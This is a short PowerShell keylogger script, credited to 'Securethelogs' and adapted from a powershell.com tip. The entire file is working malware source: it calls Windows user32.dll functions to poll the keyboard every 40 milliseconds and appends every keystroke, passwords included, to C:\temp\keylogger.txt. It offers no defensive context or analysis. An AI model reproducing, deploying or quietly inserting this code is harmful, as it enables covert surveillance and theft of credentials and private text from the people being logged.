# Creator: Securethelogs | @Securethelogs
# Modified version of: http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx

$path = "C:\temp\keylogger.txt"


if ((Test-Path $path) -eq $false) {New-Item $path}

    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    

    try {
        
        while ((Test-Path $path) -ne $false){

           

            Start-Sleep -Milliseconds 40

            
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                
                $state = $API::GetAsyncKeyState($ascii)

                
                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    
                    $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success -and (Test-Path $path) -eq $true) {
                       
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    } 
     finally {exit}


    

    
